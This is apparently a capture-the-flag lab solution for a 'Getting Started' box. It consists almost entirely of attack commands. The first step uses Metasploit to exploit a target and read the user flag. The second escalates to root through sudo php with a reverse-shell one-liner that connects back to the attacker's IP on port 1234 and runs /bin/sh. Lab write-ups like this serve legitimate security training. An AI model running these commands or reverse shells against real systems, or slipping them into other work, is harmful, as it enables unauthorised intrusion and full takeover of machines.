**Spawn the target, gain a foothold and submit the contents of the user.txt flag.
```
sudo msfconsole
search getstarted
use 1
set RHOSTS 10.129.196.212
set LHOST 10.10.15.224
run
shell
/bin/bash -i
cat /home/mrb3n/user.txt
```

**After obtaining a foothold on the target, escalate privileges to root and submit the contents of the root.txt flag.
```
sudo -l
sudo /usr/bin/php -r '$sock=fsockopen("10.10.15.224",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
